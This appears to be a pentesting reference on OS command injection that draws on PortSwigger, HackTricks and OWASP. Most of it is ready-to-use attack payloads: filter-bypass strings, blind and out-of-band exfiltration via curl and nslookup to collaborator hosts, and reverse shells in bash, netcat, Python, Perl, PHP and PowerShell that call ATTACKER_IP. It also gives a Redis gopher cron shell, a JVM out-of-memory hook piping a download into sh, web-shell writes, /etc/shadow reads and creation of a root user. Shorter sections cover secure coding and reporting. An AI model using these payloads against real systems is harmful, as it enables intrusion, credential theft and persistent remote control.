# OS Command Injection — Complete Reference

> Based on PortSwigger Web Security Academy, HackTricks, OWASP (2026-08)
> Standalone deep-dive — separate from `sql-injection-complete.md`

---

## 1. What It Is

Attacker injects OS commands into application input → server executes arbitrary commands with app privileges.

**Root cause:** User input concatenated into a command string passed to a shell interpreter.

**Difference from Code Injection:**
- **Command injection** extends default functionality (app already runs commands)
- **Code injection** adds new code that the app executes (e.g., `eval()`)

---

## 2. Injection Points

### 2.1 Classic Parameters
| Parameter | Typical Use | Injection Vector |
|-----------|-------------|-----------------|
| `?cmd=` | Direct command execution | Most obvious |
| `?exec=` | Command execution | Direct |
| `?command=` | Command execution | Direct |
| `?ping=` | Ping utility | Add separator + command |
| `?query=` | Lookup/DNS query | Command injection |
| `?host=` | Hostname/IP for ping/dig/nslookup | Add separator |
| `?ip=` | IP address for network tools | Add separator |
| `?file=` | File for processing | Traversal + pipe |
| `?path=` | Path parameter | Path traversal |
| `?domain=` | Domain for DNS lookup | Command injection |
| `?url=` | URL for curl/wget | Redirect + command |
| `?download=` | File download utility | Command injection |
| `?template=` | Template processing | Shell metachar |
| `?name=` | Filename/display name | Embedded in system call |
| `?email=` | Email for mail command | Backtick/command sub |
| `?subject=` | Subject line in email | Embedded in mail command |

### 2.2 Headers
- `Host:` — if reflected into log/commands
- `User-Agent:` — if logged via shell command
- `Referer:` — if logged via shell command
- `X-Forwarded-For:` — if logged via shell command
- `Cookie:` — if any cookie is used in shell commands

### 2.3 File Upload
- Filename: `test.php; id`
- Filename: `$(id).txt`
- Content-Type processing: if server runs `file` command on upload

### 2.4 Filename Parameters
- `/view?file=report.pdf;id`
- `/download?name=document.pdf;id`
- Path traversal + command injection combo:
  ```
  ../../../etc/passwd;id
  ```

### 2.5 HTTP Headers → Log Poisoning
If the app logs User-Agent via shell command:
```
User-Agent: <?php system($_GET['cmd']); ?>
```
Then access the log file through path traversal → RCE.

---

## 3. Shell Metacharacters — Complete Reference

### 3.1 Command Separators

| Metachar | OS | Behavior | Example |
|----------|-----|---------|---------|
| `;` | Unix | Sequential execution | `ls;id` |
| `\|` | Both | Pipe (output of first → second) | `ls\|id` |
| `\|\|` | Both | Execute second IF first fails | `fake\|\|id` |
| `&&` | Both | Execute second IF first succeeds | `ls&&id` |
| `&` | Both | Background both, second output visible | `ls&id` |
| `%0a` | Both | Newline — separate commands | `ls%0aid` |
| `` `cmd` `` | Unix | Command substitution (backticks) | `` ls`id` `` |
| `$(cmd)` | Unix | Command substitution (modern) | `$(id)` |
| `%09` | Both | Tab character (useful for spacing) | `cmd%09arg` |

### 3.2 Quoted Context Bypass
If input appears inside quotes, break out first:
```
"; id #
' OR id #
"; id #
```

### 3.3 Whitespace Alternatives
If spaces are filtered:
```
{cmd,arg1,arg2}     # Bash brace expansion (no spaces)
$IFS                 # Internal Field Separator (space/tab/newline)
${IFS}               # Alternative syntax
$'\t'                # Tab literal
%09                  # URL-encoded tab
%0a                  # URL-encoded newline
%0d%0a               # CRLF
```

### 3.4 Character Alternatives (No Letters)
If alphanumeric chars are filtered:
```
# Hex encoding
\x69\x64             # "id" in hex
\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64  # "/etc/passwd"

# Octal encoding
\151\144             # "id" in octal

# Wildcards
/???/??d             # /bin/id (3-char glob)
/???/??d             # /usr/bin/id
/???/??d /???/??ss?? # /bin/id /etc/passwd

# Brace expansion
{/,b,i,n}/id         # /bin/id
/bin/{i,d}           # /bin/id

# $() with no spaces
$(cat${IFS}/etc/passwd)
```

### 3.5 Python-Specific
```
import os;os.system('id')
__import__('os').system('id')
exec("import os;os.system('id')")
```

---

## 4. Blind OS Command Injection

### 4.1 Time-Based Detection
```bash
# Linux
& ping -c 10 127.0.0.1 &        # 10 seconds delay
& sleep 10 &                     # 10 seconds delay
& timeout 10 &                   # 10 seconds delay

# Windows
& ping -n 10 127.0.0.1 &         # 10 pings
& timeout /t 10 &                # 10 seconds delay
```

**Verify:**
```
Time: normal = 200ms
Time: ping -c 10 = 10,200ms → CONFIRMED
```

### 4.2 Time-Based Data Exfiltration (Bit by Bit)
```bash
# Extract whoami character by character
if [ $(whoami|cut -c 1) == "r" ]; then sleep 10; fi
# If response takes 10s → first char is 'r'
# If response is fast → first char is not 'r'

# Loop for all chars:
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  echo "Testing $c"
  # Use this in Burp Intruder with time-based payload
done
```

**Burp Intruder payloads:**
```
& if [ "$(whoami|cut -c 1)" == "§a§" ]; then sleep 10; fi &
```
Position 1 → a-z → check response time.

### 4.3 Output Redirection
```bash
& whoami > /var/www/static/whoami.txt &
& id > /tmp/output.txt &

# Then access: /static/whoami.txt or /tmp/output.txt
# If directory is web-accessible:
curl https://target.com/static/whoami.txt
```

### 4.4 Out-of-Band (OOB) — DNS Exfiltration
```bash
# Basic detection
& nslookup YOUR_BURP_COLLABORATOR.burpcollaborator.net &

# Data exfiltration via DNS subdomain
& nslookup `whoami`.YOUR_ID.burpcollaborator.net &
# Response: wwwuser.YOUR_ID.burpcollaborator.net

# Linux alternatives
& curl http://YOUR_ID.burpcollaborator.net/$(whoami) &
& wget http://YOUR_ID.burpcollaborator.net/$(whoami) &

# Windows alternatives
& nslookup `whoami`.YOUR_ID.burpcollaborator.net &
& powershell "Resolve-DnsName `whoami`.YOUR_ID.burpcollaborator.net"
```

### 4.5 OOB — HTTP Exfiltration
```bash
# Simple GET
& curl http://YOUR_ID.burpcollaborator.net/$(whoami) &

# POST data
& curl -X POST -d "user=$(whoami)" http://YOUR_ID.burpcollaborator.net/ &

# Windows PowerShell
& powershell "Invoke-WebRequest -Uri 'http://YOUR_ID.burpcollaborator.net/$(whoami)'" &
```

### 4.6 DNSBin Exfiltration
```
# Use dnsbin.zhack.ca or pingb.in
for i in $(ls /); do host "$i.ATTACKER_ID.dnsbin.zhack.ca"; done
```

### 4.7 OOB via ICMP
```bash
& ping -c 1 -s 1000 YOUR_IP &        # ICMP with payload
& ping -c 1 -p "$(whoami | xxd -p)" YOUR_IP &  # Data in ICMP payload
```

---

## 5. Filtering Bypass Techniques

### 5.1 Space Filtering Bypass
```bash
# Alternatives to space
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
cat</etc/passwd
cat<etc/passwd
cat$'\x20'/etc/passwd
cat%09/etc/passwd
cat%0a/etc/passwd
cat\x20/etc/passwd
X=$'\x20' && cat${X}/etc/passwd
```

### 5.2 Semicolon Filtering Bypass
```bash
# If ; is filtered
ls|id
ls&&id
ls||id
ls%0aid
ls%0d%0aid
```

### 5.3 Pipe Filtering Bypass
```bash
# If | is filtered
ls&&id
ls||id
ls;id
ls%0aid
```

### 5.4 Keyword Filtering Bypass
```bash
# If "cat" is filtered
c\at /etc/passwd
ca""t /etc/passwd
ca''t /etc/passwd
ca${x}t /etc/passwd        # x is empty variable
/bin/ca? /etc/passwd
/???/ca? /etc/passwd
cat <<< "test"
c$a$t /etc/passwd

# If "flag" or "password" is filtered
fla? /flag*
f??g /etc/p*ss?*
grep . /flag*
strings /flag*
```

### 5.5 Number Filtering Bypass
```bash
# If numeric args are filtered
ping -c 1 127.0.0.1          # -c is numeric
ping -z 1 127.0.0.1          # -z is also valid
ping -w 1 127.0.0.1          # -w timeout
sleep 1                       # No number needed
```

### 5.6 Redirect Filtering Bypass
```bash
# If > is filtered
tee /tmp/output.txt <<< "data"
python -c 'open("/tmp/f","w").write("data")'
cat /etc/passwd | base64 > /tmp/out.txt
```

### 5.7 Case-Insensitive Filtering Bypass
```bash
# If "id" is filtered (case-sensitive)
ID
Id
iD
```

### 5.8 Blacklist Bypass — Advanced
```bash
# If common commands are blacklisted
# Use encoded commands
echo "aWQ=" | base64 -d | bash          # "id" base64 encoded
echo "aWQ=" | base64 -d | sh
bash<<<$(echo "aWQ="|base64 -d)
sh<<<$(echo "aWQ="|base64 -d)

# Double pipe + eval
|| eval $(echo "aWQ="|base64 -d) ||

# Python one-liner
python3 -c "import os;os.system('id')"
python -c "import os;os.system('id')"
perl -e "system('id')"
ruby -e "system('id')"
php -r "system('id');"
```

### 5.9 Windows-Specific Filtering Bypass
```powershell
# If "whoami" is filtered
@^p^o^w^e^r^shell c:**32\c*?c.e?e   # Calc.exe
powershell C:**2\n??e*d.*?            # notepad
cmd /c wh"oa"mi                       # Split command name
cmd /c who^ami                         # Caret escape
cmd.exe /c whoami
%COMSPEC% /c whoami
```

### 5.10 IFS (Internal Field Separator) Trick
```bash
# $IFS = space/tab/newline
${IFS}       # Can replace space
cat${IFS}/etc/passwd
ping${IFS}-c${IFS}1${IFS}127.0.0.1
```

---

## 6. Language-Specific Command Injection

### 6.1 PHP
```php
// Vulnerable functions
system("ping $input");
exec("ping $input", $output);
passthru("ping $input");
shell_exec("ping $input");
popen("ping $input", "r");
proc_open("ping $input", ...);
pcntl_exec("/bin/sh", ["-c", $input]);
`ping $input`;

// Secure alternatives
// Use escapeshellarg() for arguments:
system("ping " . escapeshellarg($input));

// Use escapeshellcmd() for full commands:
system(escapeshellcmd("ping " . $input));

// Best: Use PHP built-in functions instead of shell commands
$ip = filter_var($input, FILTER_VALIDATE_IP);
```

### 6.2 Python
```python
# Vulnerable
os.system("ping " + user_input)
subprocess.call("ping " + user_input, shell=True)
subprocess.Popen("ping " + user_input, shell=True)
commands.getoutput("ping " + user_input)

# Secure
subprocess.run(["ping", user_input], shell=False)  # No shell!
subprocess.run(["ping", "-c", "1", user_input])     # Separate args

# Injection payloads (via web parameter)
; os.system('id')
| __import__('os').system('id')
$(python -c "import os;os.system('id')")
```

### 6.3 Node.js
```javascript
// Vulnerable
const { exec } = require('child_process');
exec(`ping ${userInput}`);           // Shell spawned!

// Secure
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', userInput]);  // No shell involved

// Also vulnerable
child_process.exec('ping ' + userInput);
child_process.spawn('ping ' + userInput, { shell: true });

// Secure
child_process.spawn('ping', ['-c', '1', userInput]);  // No shell
```

### 6.4 Java
```java
// Important: Java Runtime.exec() does NOT use a shell!
// It splits string into array and executes first element as command.
// Shell metacharacters DON'T work for chaining!
Runtime.getRuntime().exec("ping " + input);  // input becomes arg, not command
// & | ; && || all become LITERAL ARGUMENTS to ping

// To exploit Java:
// 1. Pipe operator in some contexts:
ProcessBuilder pb = new ProcessBuilder("bash", "-c", "ping " + input);

// 2. If app uses ProcessBuilder with "bash", "-c":
Runtime.getRuntime().exec(new String[]{"bash", "-c", "ping " + input});

// 3. RCE via Runtime.exec with array manipulation:
// Input: /bin/bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}
String[] cmd = {"/bin/bash", "-c", input};
Runtime.getRuntime().exec(cmd);
```

### 6.5 Ruby
```ruby
# Vulnerable
system("ping #{input}")
`ping #{input}`
IO.popen("ping #{input}")
exec("ping #{input}")

# Secure
system("ping", input)  # Separate args, no shell
```

### 6.6 C
```c
// Vulnerable
system("ping " + input);      // Passes to /bin/sh
exec("ping " + input);        // Also shell-based

// Secure (no shell involved)
execl("/bin/ping", "ping", input, NULL);  // Direct exec, no shell
```

### 6.7 PHP (proc_open / shell_exec)
```php
// proc_open with command string = VULNERABLE
proc_open("ping $input", ...);

// shell_exec = VULNERABLE
shell_exec("ping $input");

// Safe: use array-based arguments
proc_open(["ping", $input], ...);
```

### 6.8 PHP runkit / Rule Engine Abuse
```php
// If PHP runkit extension is loaded:
// Admin "rule engine" that evaluates attacker-supplied PHP
runkit_function_redefine('checkBid', '$bid',
    'system($_GET["cmd"]); return true;');
// Persistent RCE in web context
```

---

## 7. Real-World Exploitation

### 7.1 Reverse Shell (Linux)
```bash
# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Netcat reverse shell
nc -e /bin/bash ATTACKER_IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl reverse shell
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 7.2 Reverse Shell (Windows)
```powershell
# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe
```

### 7.3 File Read
```bash
cat /etc/passwd
cat /etc/shadow
type C:\Windows\win.ini
type C:\Windows\System32\drivers\etc\hosts
```

### 7.4 File Write
```bash
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > /tmp/shell.sh
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
echo "test" > /tmp/test.txt
```

### 7.5 Privilege Escalation via Command Injection
```bash
# If app runs as root with command injection:
cat /etc/shadow
cat /root/.ssh/id_rsa
useradd -o -u 0 attacker     # Create root user
passwd attacker               # Set password

# SUID binary with command injection:
./vuln_binary "; chmod +s /bin/bash"
```

### 7.6 Reverse Shell via SSRF
```bash
# Gopher protocol → Redis → cron reverse shell
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

### 7.7 Bypassing Linux Restrictions (HackTricks)
```bash
# Generic bypass payloads
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay

# Bash arithmetic evaluation in RewriteMap/CGI scripts (Ivanti EPMM pattern):
# Send: st=theValue&h=gPath['sleep 5']
# Results in sleep 5 execution during arithmetic check
```

---

## 8. Argument/Option Injection (No Shell Metacharacters Needed)

### 8.1 Concept
If app passes user input as argument to a system utility (even without shell):
```
ping <user_input>
curl <user_input>
tcpdump -i <iface> -w <user_input>
```

### 8.2 Dangerous Flags

**ping:**
```
-f                   # Flood mode (DoS)
-c 100000            # Many packets (DoS)
-s 65535             # Max packet size (DoS)
```

**curl:**
```
-o /tmp/shell.php    # Write to arbitrary path
-K http://attacker.com/config  # Load attacker-controlled config
--data-urlencode "cmd=id"     # POST data to server
```

**wget:**
```
-O /tmp/shell.php    # Write to arbitrary path
--post-file=/etc/passwd  # POST file content
```

**tcpdump:**
```
-G 1 -W 1 -z /tmp/script.sh  # Execute script on rotation
-z /bin/sh                    # Direct shell execution
```

**ssh:**
```
-o ProxyCommand=id    # Execute command via proxy
```

### 8.3 End-of-Options Bypass
```bash
# -- marks end of options, rest is treated as filename
# If app prepends -- to bypass:
program -- user_input     # user_input is still an argument
# Try:
program -- -f -c 1        # Flags after -- are filenames
```

### 8.4 Generic PoC Against CGI Dispatchers
```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

topicurl=<handler>&param=-n
topicurl=setEasyMeshAgentCfg&agentName=;id;
```

---

## 9. JVM Diagnostic Callbacks (Java RCE)

### 9.1 Concept
If you can inject JVM command-line arguments:
```bash
# Force OOM → trigger error hook → execute command
_JAVA_OPTIONS="-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError='curl http://attacker/payload.sh|sh'"
```

### 9.2 Payload
```bash
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```

### 9.3 Delivery Methods
- `_JAVA_OPTIONS` environment variable
- Launcher config files
- `AdditionalJavaArguments` fields in desktop agents
- Localhost WebSocket abuse → JVM flag injection

---

## 10. Detection Methodology

### 10.1 Basic Detection
```
# Send unique string + observe reflection
id
id;id
id|id
id&&id

# If all produce output → OS command injection confirmed
# If only some work → check which metacharacters are filtered
```

### 10.2 Detection Workflow
```
1. Identify input points (all parameters, headers, filenames)
2. Test basic separator: ;  |  &&  ||  &
3. If separator works: inject "id" or "whoami"
4. If output visible → CONFIRMED (in-band)
5. If no output → test blind:
   a. Time-based: sleep 10 / ping -c 10
   b. OOB: nslookup YOUR_COLLAB
   c. Output redirect: > /tmp/out
6. Map the full filter:
   - Test each metachar individually
   - Test encoding (URL, double, hex, octal)
   - Test whitespace alternatives
7. Extract data:
   - File read: cat /etc/passwd
   - Reverse shell
   - OOB exfiltration
```

### 10.3 Time Delay Confirmation
```
# Baseline
GET /vuln?cmd=id        → 200ms

# Injection
GET /vuln?cmd=id%0asleep%2010  → 10,200ms

# If delay = injected delay → CONFIRMED
# If delay != expected → partial filter or different execution context
```

---

## 11. Top 25 RCE Parameters to Test

```
?cmd={payload}
?exec={payload}
?command={payload}
?execute={payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

Source: @trbughunters

---

## 12. Prevention

### 12.1 Golden Rule
**Never call OS commands from application code.** Use platform APIs instead.

### 12.2 If You Must Use Shell Commands
- **Validate input:** Whitelist allowed characters (alphanumeric only)
- **Use array-based execution:** Pass arguments as array, not concatenated string
- **Never escape:** Shell metacharacter escaping is error-prone and bypassable

### 12.3 Language-Specific Secure Patterns

**PHP:**
```php
// GOOD: Use PHP functions instead of shell
$ip = filter_var($input, FILTER_VALIDATE_IP);

// GOOD: escapeshellarg for arguments
system("ping " . escapeshellarg($input));
```

**Python:**
```python
# GOOD: No shell, separate args
subprocess.run(["ping", "-c", "1", user_input], shell=False)
```

**Node.js:**
```javascript
// GOOD: execFile without shell
execFile('ping', ['-c', '1', userInput]);
```

**Java:**
```java
// GOOD: ProcessBuilder with separate args
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", input);
```

---

## 13. Useful Commands After Exploitation

### Linux
| Purpose | Command |
|---------|---------|
| Current user | `whoami` |
| User ID | `id` |
| OS info | `uname -a` |
| Network config | `ifconfig` / `ip a` |
| Network connections | `netstat -an` / `ss -tlnp` |
| Running processes | `ps -ef` / `ps aux` |
| Kernel version | `cat /proc/version` |
| Environment vars | `env` / `set` |
| Sudo permissions | `sudo -l` |
| SUID binaries | `find / -perm -4000 2>/dev/null` |
| Writable dirs | `find / -writable -type d 2>/dev/null` |
| Crontabs | `cat /etc/crontab` / `ls -la /var/spool/cron/` |
| Password file | `cat /etc/passwd` |
| Shadow file | `cat /etc/shadow` |

### Windows
| Purpose | Command |
|---------|---------|
| Current user | `whoami` |
| OS info | `ver` / `systeminfo` |
| Network config | `ipconfig /all` |
| Network connections | `netstat -an` |
| Running processes | `tasklist` / `wmic process list` |
| Services | `net start` / `sc query` |
| Users | `net user` |
| Groups | `net localgroup` |
| Startup programs | `wmic startup list full` |
| Installed software | `wmic product list brief` |
| Environment | `set` |
| Password file | `type C:\Windows\win.ini` |
| IIS config | `type C:\inetpub\wwwroot\web.config` |

---

## 14. Report Template

### Critical: OS Command Injection (CVSS 9.8)
**Title:** Unauthenticated OS Command Injection in [parameter] at [endpoint]
**Severity:** Critical (CVSS: 9.8 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Description:** The application passes unsanitized user input from the `[parameter]` parameter to an OS shell command, allowing an unauthenticated attacker to execute arbitrary commands on the server.

**Impact:** Full server compromise — read/write/delete any file, establish persistence, lateral movement to internal network, data exfiltration, cryptomining.

**PoC:**
```
GET /endpoint?param=id HTTP/1.1
Host: target.com

Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Remediation:**
- Never pass user input to OS shell commands
- Use language-native APIs instead of shell commands
- If shell commands are required, use array-based execution with strict input validation

### High: Blind OS Command Injection (CVSS 8.6)
**Title:** Blind OS Command Injection via [parameter] at [endpoint]
**Severity:** High (CVSS: 8.6 — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

**Description:** Blind command injection confirmed via time-based technique. Application passes user input to shell command without returning output.

**PoC:**
```
# Baseline: ~200ms response
GET /endpoint?param=id HTTP/1.1

# Injected: ~10,200ms response (10s delay confirmed)
GET /endpoint?param=id%0asleep%2010 HTTP/1.1

# OOB confirmed via Burp Collaborator:
GET /endpoint?param=id%0anslookup%20`.whoami`.COLLAB_ID.burpcollaborator.net HTTP/1.1
→ DNS query: www-data.COLLAB_ID.burpcollaborator.net
```

---

## 15. Cross-References
- PortSwigger: https://portswigger.net/web-security/os-command-injection
- HackTricks: https://book.hacktricks.xyz/pentesting-web/command-injection
- OWASP: https://owasp.org/www-community/attacks/Command_Injection
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- See also: `sql-injection-complete.md` (SSTI section), `file-path-traversal-complete.md` (SSRF → RCE via Redis)
